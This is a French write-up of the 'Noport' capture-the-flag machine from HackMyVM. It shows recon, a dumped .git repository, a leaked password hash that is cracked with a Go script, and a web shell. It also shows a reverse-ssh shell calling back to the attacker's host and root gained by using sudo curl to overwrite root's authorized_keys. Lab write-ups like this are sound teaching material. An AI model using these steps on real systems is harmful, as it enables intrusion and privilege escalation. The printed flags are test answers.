---
title: "Solution du CTF Noport de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

**Noport** est un CTF créé par [akared777](https://hackmyvm.eu/profile/?user=akared777) et dispo sur HackMyVM. C'est le petit dernier au moment de ces lignes.

### Repérages

La VM ne répond pas au ping, heureusement que l'IP est affichée dans les logs de démarrage (mais sans ça, on aurait scanné les ports 80 par exemple).

```console
$ ping 192.168.56.103
PING 192.168.56.103 (192.168.56.103) 56(84) octets de données.
^C
--- statistiques ping 192.168.56.103 ---
6 paquets transmis, 0 reçus, 100% packet loss, time 5115ms
```

De port ouvert, il n'y en a qu'un seul :

```console
$ sudo nmap -T5 -p- -Pn 192.168.56.103
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.103
Host is up (0.00037s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:77:70:15 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 53.04 seconds
```

La page d'index est un formulaire de login tout simple. J'ai lancé Wapiti sur le site, histoire de voir s'il trouvait quelque chose.

Le module Nikto a trouvé quelques entrées :

```console
[*] Launching module nikto
---
Apache 2.0 default script is executable and reveals system information. All default scripts should be removed.
http://192.168.56.103/cgi-bin/test-cgi
References:
  https://vulners.com/osvdb/OSVDB:CWE-552
---
---
This might be interesting.
http://192.168.56.103/test.php
References:
  https://vulners.com/osvdb/OSVDB:
---
---
Git Index file may contain directory listing information.
http://192.168.56.103/.git/index
References:
  https://vulners.com/osvdb/OSVDB:
---
---
Git config file found. Infos about repo details may be present.
http://192.168.56.103/.git/config
References:
  https://vulners.com/osvdb/OSVDB:
---
```

Commençons par le script `test.php` qui est peu bavard. Je brute-force des noms de paramètres :

```console
$ ffuf -u "http://192.168.56.103/test.php?FUZZ=1" -w common_query_parameter_names.txt -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.103/test.php?FUZZ=1
 :: Wordlist         : FUZZ: common_query_parameter_names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 0
________________________________________________

uri                     [Status: 200, Size: 12, Words: 2, Lines: 1]
:: Progress: [5699/5699] :: Job [1/1] :: 1793 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

Si je passe l'URL de mon serveur web au paramètre `uri` j'obtiens en retour `Bot executed` mais je remarque que le script n'a pas envoyé de requête HTTP sur mon serveur...

Je passe donc au dossier `.git`. On va extraire les infos avec `git-dumper` :

```console
$ git-dumper http://192.168.56.103/.git/ output
[-] Testing http://192.168.56.103/.git/HEAD [200]
[-] Testing http://192.168.56.103/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://192.168.56.103/.git/ [200]
[-] Fetching http://192.168.56.103/.gitignore [401]
[-] http://192.168.56.103/.gitignore responded with status code 401
[-] Fetching http://192.168.56.103/.git/HEAD [200]
[-] Fetching http://192.168.56.103/.git/COMMIT_EDITMSG [200]
[-] Fetching http://192.168.56.103/.git/description [200]
[-] Fetching http://192.168.56.103/.git/branches/ [200]
[-] Fetching http://192.168.56.103/.git/index [200]
[-] Fetching http://192.168.56.103/.git/info/ [200]
[-] Fetching http://192.168.56.103/.git/hooks/ [200]
[-] Fetching http://192.168.56.103/.git/config [200]
[-] Fetching http://192.168.56.103/.git/logs/ [200]
[-] Fetching http://192.168.56.103/.git/refs/ [200]
[-] Fetching http://192.168.56.103/.git/objects/ [200]
--- snip ---
[-] Fetching http://192.168.56.103/.git/objects/b4/09ae52f1f27e51c0041a1a9079d301133266fa [200]
[-] Fetching http://192.168.56.103/.git/objects/54/e3cc3f64b031833ce92d7a677f99c8f3ee0750 [200]
[-] Fetching http://192.168.56.103/.git/objects/fb/3f381eefe8c33ea7151921e637f9a8ee7cad15 [200]
[-] Fetching http://192.168.56.103/.git/objects/af/f22f58c8dcfd5535cab50dca5b2bb2c2b79435 [200]
[-] Fetching http://192.168.56.103/.git/logs/refs/heads/master [200]
[-] Sanitizing .git/config
[-] Running git checkout .
5 chemins mis à jour depuis l'index
```

Dedans, on trouve différents fichiers :

```console
$ ls -al
total 28
drwxr-xr-x 1 sirius users   106 20 mai   09:12 .
drwxrwxrwt 1 root   root   9700 20 mai   09:13 ..
-rw-r--r-- 1 sirius users  1044 20 mai   09:12 ctf.conf
drwxr-xr-x 1 sirius users   128 20 mai   09:12 .git
-rw-r--r-- 1 sirius users   307 20 mai   09:12 .htaccess
-rw-r--r-- 1 sirius users  3951 20 mai   09:12 index.php
-rwxr-xr-x 1 sirius users  1535 20 mai   09:12 nginx.conf
-rw-r--r-- 1 sirius users 12288 20 mai   09:12 .test.php.swp
```

### De la config et du code

D'abord : la swap Vim pour `test.php`. Je ne suis pas familier avec le format de ces fichiers, mais il semble qu'il faille le lire à l'envers donc j'utilise `tac` :

```php
$ strings .test.php.swp | tac
<?php
//czj
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') {
    header('HTTP/1.1 403 Forbidden');
    echo "Access Denied";
    exit;
$admin_password=getenv('ADMIN_PASS');
$base_url = 'http://127.0.0.1:80'; 
$log_file = __DIR__ . '/log';
function write_log($message) {
    global $log_file;
    $timestamp = date('Y-m-d H:i:s');
    $log_entry = "[$timestamp] $message\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND);
function login_and_get_cookie() {
    global $base_url, $admin_password;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$base_url/login");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'username' => 'admin',
        'password' => $admin_password
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, '');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    $headers = [
        'User-Agent: Bot',
        'Accept: application/json',
        'Content-Type: application/x-www-form-urlencoded'
    ];
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        write_log("cURL login error: " . curl_error($ch));
        curl_close($ch);
        return null;
    }
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $header = substr($response, 0, $header_size);
    curl_close($ch);
    preg_match('/PHPSESSID=([^;]+)/', $header, $matches);
    return $matches[1] ?? null;
function bot_runner($uri) {
    global $base_url;
    $cookie = login_and_get_cookie();
    
    if (!$cookie) {
        write_log("Failed to get admin cookie");
        return;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$base_url/$uri");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=$cookie");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEFILE, '');
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        write_log("cURL visit error: " . curl_error($ch));
    } else {
        write_log("Bot visited $uri, response: " . substr($response, 0, 100));
    }
    curl_close($ch);
    sleep(1);
if (isset($_GET['uri'])) {
    $uri = $_GET['uri'];
    write_log("Bot triggered for URI: $uri");
    bot_runner($uri);
    echo "Bot executed";
    bot_runner}
    echo "Bot executed";
#"! 
U3210
utf-8
~kali/test.php
kali
kali
b0VIM 9.1
```

On voit que ce script va lire un path (via le paramètre `uri`) sur `127.0.0.1` puis écrire la réponse (tronquée à 100 octets) dans le fichier `/log`.

Il apparait que je peux accéder à ce fichier, mais il ne contient rien d'intéressant à ce stade.

Maintenant voici le script `index.php` :

```php
<?php
session_start();
$uri = $_SERVER['REQUEST_URI'];
$path = trim(parse_url($uri, PHP_URL_PATH), '/');

function verify_user() {
    if (!isset($_SESSION['username'])) {
        header('HTTP/1.1 401 Unauthorized');
        echo json_encode(["error" => "Please login first"]);
        exit;
    }
    return $_SESSION['username'];
}

function get_db_connection() {
    $db = new SQLite3('/var/www/html/database.db');
    return $db;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $path === 'visit') {
    #$username = verify_user();
    $uri = $_POST['uri'] ?? '';
    if (empty($uri)) {
        header('HTTP/1.1 400 Bad Request');
        echo json_encode(["error" => "URI is required"]);
        exit;
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://127.0.0.1:8080/test.php?uri=" . urlencode($uri));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Host: 127.0.0.1:8080"  
    ]);
    $res=curl_exec($ch);
    if (curl_errno($ch)) {
        error_log("cURL error calling test.php: " . curl_error($ch));
    } else {
        error_log("test.php response: " . $response);
    }
    curl_close($ch);

    header('Content-Type: application/json');
    echo json_encode(["message" => "Bot is visiting: $uri"]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $path === 'login') {
    $username = $_POST['username'] ?? '';
    $password = hash('sha256', $_POST['password']) ?? '';
     
    $db = get_db_connection();
    $stmt = $db->prepare('SELECT * FROM users WHERE username = :username AND password = :password');
    $stmt->bindValue(':username', $username, SQLITE3_TEXT);
    $stmt->bindValue(':password', $password, SQLITE3_TEXT);
    $result = $stmt->execute();
    $user = $result->fetchArray(SQLITE3_ASSOC);
     
    if ($user) {
            $_SESSION['username'] = $user['username'];
            echo json_encode(["message" => "Logged in successfully"]);
            header('Location: sh3ll.php');
    } else {
        header('HTTP/1.1 401 Unauthorized');
        echo json_encode(["error" => "Invalid credentials"]);
    }
    $db->close();
    exit;
}

if (!empty($path)) {
    $username = verify_user();
    $db = get_db_connection();
    if (preg_match('/^profile/', $path)) {
        $stmt = $db->prepare('SELECT id, username, email, password, api_key, created_at FROM users WHERE username = :username');
        $stmt->bindValue(':username', $username, SQLITE3_TEXT);
        $result = $stmt->execute();
        $user = $result->fetchArray(SQLITE3_ASSOC);

        if ($user) {
            header('Content-Type: application/json');
                header_remove("Cache-Control");
                header_remove("Pragma");
                header_remove("Expires");
            echo json_encode([
                "id" => $user['id'],
                "username" => $user['username'],
                "email" => $user['email'],
                "password" => $user['password'],
                "api_key" => $user['api_key'],
                "created_at" => $user['created_at']
            ]);
        } else {
            header('HTTP/1.1 404 Not Found');
                header_remove("Cache-Control");
                header_remove("Pragma");
                header_remove("Expires");
            echo json_encode(["error" => "User not found"]);
        }
    } else {
        $file_path = '/var/www/html/' . $path;
        if (file_exists($file_path)) {
            readfile($file_path); 
        } else {
                header('HTTP/1.1 404 Not Found');
                header_remove("Cache-Control");
                header_remove("Pragma");
                header_remove("Expires");
            echo json_encode(["error" => "No match"]);
        }
    }
    $db->close();
    exit;
}


?>
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
    <h2>Login</h2>
    <form method="post" action="/login">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
```

Il gère l'authentification proprement, avec en backend une base SQLite nommée `database.db`. Je ne peux pas y accéder, le serveur retourne une 403.

Reste des points intéressants. Premièrement le path du script demandé est extrait via `path = trim(parse_url(uri, PHP_URL_PATH), '/');`.

Étonnant ? Pas si on regarde le fichier `.htaccess` :

```apache
RewriteEngine On

# 如果 /visit 被直接访问，重写到 /index.php
RewriteRule ^visit /index.php [L]
RewriteRule ^profile /index.php [L]

# 确保其他请求（例如静态文件）不被重写
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ /index.php [L]
```

On peut donc atteindre `index.php` de différentes méthodes.

L'autre point important, c'est que l'appel à `verify_user` est commenté si on POST des données sur `/visit`.

Je vous fais grace du fichier de configuration de Nginx mais voici celui nommé `ctf.conf` :

```apache
server {
        listen 80;
        root /var/www/html;
        index index.php;

        location ~ .*\.(css|js|png|jpg)$ {
            proxy_cache cache;
            proxy_cache_valid 200 3m;
            proxy_cache_use_stale error timeout updating;
            expires 3m;
            add_header Cache-Control "public";
            add_header X-Cache $upstream_cache_status;
            proxy_pass http://127.0.0.1:8080;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
        }
        location / {
            proxy_pass http://127.0.0.1:8080;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
        }

        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;

}
```

### A l'attaque!

Ici pas d'inclusion, car `curl` est utilisé. Pas de SSRF, car une URL de base est définie. Notre seule chance, c'est de dumper des informations dans le fichier `log`.

C'est là que le path `/profile` est utile : il dumpe même le hash de l'utilisateur.

On ne peut pas obtenir ce dump directement depuis `index.php` car il attend une authentification, mais `test.php` va se charger d'envoyer les identifiants à notre place.

Donc :

1. On tape le `index.php` via `/visit` qui n'a pas d'authentification

2. On met `uri` à `profile` qui va faire l'auth à notre place

3. `index.php` retourne les infos

4. `test.php` les écrit dans le log

5. On accède au log, on trouve un hash, c'est la méga bamboule

```console
$ curl -D- -XPOST http://192.168.56.103/visit -d "uri=profile"
HTTP/1.1 200 OK
Server: nginx
Content-Type: application/json
Content-Length: 38
Connection: keep-alive
X-Powered-By: PHP/7.3.22
Set-Cookie: PHPSESSID=49h2e8ups1uteop5hb47eh7bv2; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

{"message":"Bot is visiting: profile"}
```

On voit cette ligne dans les logs :

```
[2025-05-20 12:39:50] Bot visited profile, response: {"id":1,"username":"admin","email":"admin@example.com","password":"6f06ee724b86fca512018ad692a62aedc
```

On ne dispose que de la moitié du hash à cause des données présentes avant.

Une recherche Google sur ce préfixe ne retourne rien d'intéressant. Voici un code Go qui prend un fichier dictionnaire, calcule le hash sha256 de chaque mot et vérifie le préfixe :

```go
package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"strings"
)

const hashPrefix = "6f06ee724b86fca512018ad692a62aedc"

func main() {
	if len(os.Args) != 2 {
		fmt.Fprintf(os.Stderr, "Usage: %s <wordlist_file>\n", os.Args[0])
		os.Exit(1)
	}

	wordlistPath := os.Args[1]
	file, err := os.Open(wordlistPath)
	if err != nil {
		log.Fatalf("Erreur d'ouverture de fichier: %v", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	count := 0
	for scanner.Scan() {
		word := strings.TrimSpace(scanner.Text())
		hash := sha256.Sum256([]byte(word))
		hashHex := hex.EncodeToString(hash[:])

		if strings.HasPrefix(hashHex, hashPrefix) {
			fmt.Printf("[✔] Trouvé: \"%s\" → %s\n", word, hashHex)
			return
		}

		count++
		if count%100000 == 0 {
			fmt.Printf("... %d mots testés\n", count)
		}
	}

	if err := scanner.Err(); err != nil {
		log.Fatalf("Erreur de lecture: %v", err)
	}

	fmt.Println("[✘] Aucun mot correspondant trouvé.")
}

```

C'est vite cassé :

```console
$ go run main.go rockyou.txt
... 100000 mots testés
... 200000 mots testés
... 300000 mots testés
[✔] Trouvé: "shredder1" → 6f06ee724b86fca512018ad692a62aedc6c49c58af0b272eeb859d525a9d406c
```

### Du reverse shell et du root

Avec les identifiants `admin` / `shredder1`, on peut se connecter via `index.php` et accéder à `sh3ll.php` qui permet l'exécution de commandes.

Après avoir rapatrié `reverse-ssh` sur ma VM, je le mets en écoute sur mon port 80 :

```bash
sudo ./reverse-sshx64 -l -p 80 -v
```

Et sur notre victime :

```bash
nohup /tmp/reverse-sshx64 -p 80 192.168.56.1&
```

On retrouve les fichiers:

```console
bash-5.0$ pwd
/var/www/localhost/htdocs
bash-5.0$ ls -al
total 88
drwxr-xr-x    3 apache   apache        4096 May 20 10:44 .
drwxr-xr-x    4 root     root          4096 Apr 20 13:45 ..
drwxr-xr-x    8 apache   apache        4096 Apr 21 01:24 .git
-rw-r--r--    1 apache   apache         307 Mar  2 10:28 .htaccess
-rw-r--r--    1 apache   apache       12288 Mar  2 11:09 .test.php.swp
-rw-r--r--    1 apache   apache        1044 Apr 21 01:22 ctf.conf
-rw-r--r--    1 apache   apache       20480 Apr 22 14:06 database.db
-rw-r--r--    1 apache   apache        4031 Apr 21 14:54 index.php
-rw-r--r--    1 apache   apache       19103 May 20 10:44 log
-rwxr-xr-x    1 apache   apache        1535 Mar  2 11:12 nginx.conf
-rw-r--r--    1 apache   apache         452 Mar  1 14:06 sh3ll.php
-rw-r--r--    1 apache   apache        2421 Apr 22 14:28 test.php
```

Je remonte d'un cran et trouve un indice :

```console
bash-5.0$ cd ..
bash-5.0$ ls
localhost  logs       modules    pass       run
bash-5.0$ cat pass 
To prevent myself fron forgetting my password,i set my password to be the same as the website password so that i wont forget it
```

Il n'y a qu'un seul utilisateur sur la machine donc difficile de se tromper. On ne peut pas utiliser `su` cependant.

```console
bash-5.0$ su akaRed
bash: /bin/su: Permission denied
```

Un port SSH est en écoute sur 127.0.0.1, alors j'en profite pour me connecter sur le compte `akaRed`.

```console
noport:~$ cat user.txt 
flag{UR_s0_Good_*n-n3tvv0rk_For_660930334}
noport:~$ sudo -l
User akaRed may run the following commands on noport:
    (root) NOPASSWD: /usr/bin/curl
    (root) NOPASSWD: /sbin/reboot
```

On va exploiter l'entrée `sudo` pour `curl` avec le protocole `file://`.

J'écris une clé publique SSH et je la copie dans le `authorized_keys` de root :

```console
noport:~$ echo "ssh-rsa AAAAB--- snip ---V7Ez8/h" > key_no_pass.pub
noport:~$ sudo curl file:///home/akaRed/key_no_pass.pub -o /root/.ssh/authorized_keys
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   381  100   381    0     0  4044k      0 --:--:-- --:--:-- --:--:-- 4044k
```

Je n'ai plus qu'à utiliser la clé privée pour me connecter :

```console
noport:~$ ssh -i key_no_pass root@127.0.0.1
noport:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
noport:~# ls -al
total 24
drwx------    3 root     root          4096 Apr 22 14:18 .
drwxr-xr-x   22 root     root          4096 Apr 20 13:51 ..
lrwxrwxrwx    1 root     root             9 Apr 20 13:52 .ash_history -> /dev/null
-rw-r--r--    1 root     root            51 Apr 21 01:23 .gitconfig
drwxr-xr-x    2 root     root          4096 May 20 11:08 .ssh
-rw-r--r--    1 root     root            44 Apr 22 14:42 root.txt
-rw-r--r--    1 root     root           130 Apr 20 18:17 runme.sh
noport:~# cat root.txt 
flag{Ur_t3h_Trvely_n3tvv0rk_@ce_on_QQGroup}
```
